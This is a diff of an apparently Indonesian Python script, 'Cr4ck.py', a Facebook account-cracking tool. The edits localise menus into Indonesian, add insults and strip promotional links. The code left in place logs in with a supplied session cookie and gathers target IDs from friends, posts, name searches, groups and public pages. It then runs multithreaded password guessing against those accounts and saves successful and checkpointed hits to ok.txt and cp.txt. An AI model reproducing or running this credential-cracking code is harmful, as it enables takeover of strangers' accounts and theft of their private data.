@@ -22,26 +22,26 @@ def aahh(s):
 def kontol():
     time.sleep(0.3)
     print("""\n\x1b[1;91m█████████████████████
-       █████████████████████
-\x1b[1;97m       █████████████████████
-       █████████████████████
-\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m paler\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•      
-\x1b[1;94m────────────────────────────────────────────────────
+ █████████████████████
+\x1b[1;97m█████████████████████
+█████████████████████
+\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ────────paler──────── \x1b[1;92m •\x1b[1;93m•\x1b[1;91m•      
+\x1b[1;93m────────────────────────────────────────────────────
 \x1b[1;91mAuthor   : ehan kihh
-\x1b[1;94m────────────────────────────────────────────────────""")
+\x1b[1;93m────────────────────────────────────────────────────""")
 
 def jembut():
     print("""\n\x1b[1;91m█████████████████████
-       █████████████████████
-\x1b[1;97m       █████████████████████
-       █████████████████████
+█████████████████████
+\x1b[1;97m█████████████████████
+█████████████████████
 \x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m paler\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•      
-\x1b[1;94m────────────────────────────────────────────────────
+\x1b[1;93m────────────────────────────────────────────────────
 \x1b[1;91mAuthor   : ehan kihh
-\x1b[1;94m────────────────────────────────────────────────────""")
+\x1b[1;93m────────────────────────────────────────────────────""")
 
 def yayanxd():
-    yayan=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
+    yayan=input("\n\033[00m\t   [\033[96m enter aja\033[97m ] ")
     if yayan == "": 
        os.system("python Cr4ck.py")
     else:
@@ -71,8 +71,8 @@ def moch_yayan():
              except FileNotFoundError:
                    ikeh_ikeh_kimochi()
                    kontol()
-                   cek = input("\n\033[0;92m       [ \033[0;97mThis Tool Use Facebook Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
-                   print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
+                   cek = input("\n\033[0;92m       [ \033[0;97mtool ini menggunakan Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
+                   print('\n\033[97m [\033[92m+\033[97m] \033[92mtunggu ya bang.....')
              cek = {"cookie":cek}
              ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
              if "mbasic_logout_button" in str(ismi):
@@ -86,14 +86,13 @@ def moch_yayan():
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.get(mbasic.format("/KM39453"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
                      aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
              else:
-                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
+                  os.system("") 
                   os.system('rm -rf cookies')
                   print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                   os.system('python Cr4ck.py')
@@ -201,15 +200,15 @@ def moch_yayan():
                    kuki = {'cookie':kukis}
                    ikeh_ikeh_kimochi()
                    kontol()
-                   aahh('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
-                   aahh('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
-                   aahh('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
-                   aahh('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
-                   aahh('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
-                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
-                   aahh('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
-                   aahh('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
-                   print('\x1b[1;94m────────────────────────────────────────────────────')
+                   aahh('\033[1;97m [\033[1;92m01\033[1;92m] CRACK DARI ID TEMAN')
+                   aahh('\033[1;97m [\033[1;92m02\033[1;93m] CRACK DARI LINK POSTING')
+                   aahh('\033[1;97m [\033[1;92m03\033[1;94m] CRACK DARI CARI NAMA')
+                   aahh('\033[1;97m [\033[1;92m04\033[1;95m] CARCK DARI ID GRUP')
+                   aahh('\033[1;97m [\033[1;92m05\033[1;96m] CRACK DARI ID PUBLIK')
+                   aahh('\033[1;97m [\033[1;92m06\033[1;97m] LIAT HASIL CRACK')
+                   aahh('\033[1;97m [\033[1;92m07\033[1;98m] HAPUS COOKIES')
+                   aahh('\033[1;97m [\033[1;91m00\033[1;99m] KELUAR')
+                   print('\x1b[1;93m────────────────────────────────────────────────────')
                    memek = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                    if memek =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
@@ -286,28 +285,28 @@ def moch_yayan():
                                          with open('cp.txt','a') as f:
                                                  f.write(x+"\n")
 
-                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Done....")
-                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
+                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] crack selesai....")
+                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] simpan \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                          except FileNotFoundError:
-                                 exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
+                                 exit("\n\033[00m[\033[91m!\033[00m] yahahaha gk dapat")
                    else:
-                         print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
+                         print("\n\n \033[00m[\033[91m!\033[00m] cari yang asli goblok!")
                          yayanxd()
                    print()
                    ikeh_ikeh_kimochi()
                    jembut()
-                   print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
+                   print('\n\x1b[1;96m         ✰─────────sabar────────✰')
+                   print('\x1b[1;95m           ✰─────────────────────✰')
+                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     ──────────────────────\n",end="")       
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
                    aahh('\x1b[1;94m────────────────────────────────────────────────────\n')
                    ikeh_ikeh_kimochi()
                    jembut()
-                   print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
-                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
+                   print('\n\x1b[1;92m        ✰─────────sabar────────✰')
+                   print('\x1b[1;97m           ✰─────────────────────✰')
+                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     ──────────────────────\n",end="")
                    print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                    print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
@@ -336,13 +335,13 @@ def moch_yayan():
                        exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")
 
     elif yayan == "2" or yayan =="02":
-         os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
+         os.system("xdg-open") 
          yayanxd()
     elif yayan == "3" or yayan =="03":
-         os.system('xdg-open https://www.facebook.com/groups/1683226775285117')
+         os.system('')
          yayanxd()
     elif yayan == "4" or yayan =="04":
-         os.system('xdg-open https://www.facebook.com/groups/868734063220514')
+         os.system('')
          yayanxd()
     elif yayan == "5" or yayan =="05":
          print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
@@ -350,8 +349,8 @@ def moch_yayan():
          print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
          yayanxd()
     elif yayan == "0" or yayan =="00":
-         aahh("\n\033[1;92m Thank you for using my tools.\n  Don't forget to subscribe to My YouTube Channel\n\n")
-         os.system('xdg-open https://youtube.com/channel/UCS7oHOu5H6nZbSmxSfnT56A')
+         aahh("\n\033[1;92m pergi sana lu anjing\n\n")
+         os.system('')
          exit()                   	
 
 if __name__=="__main__":
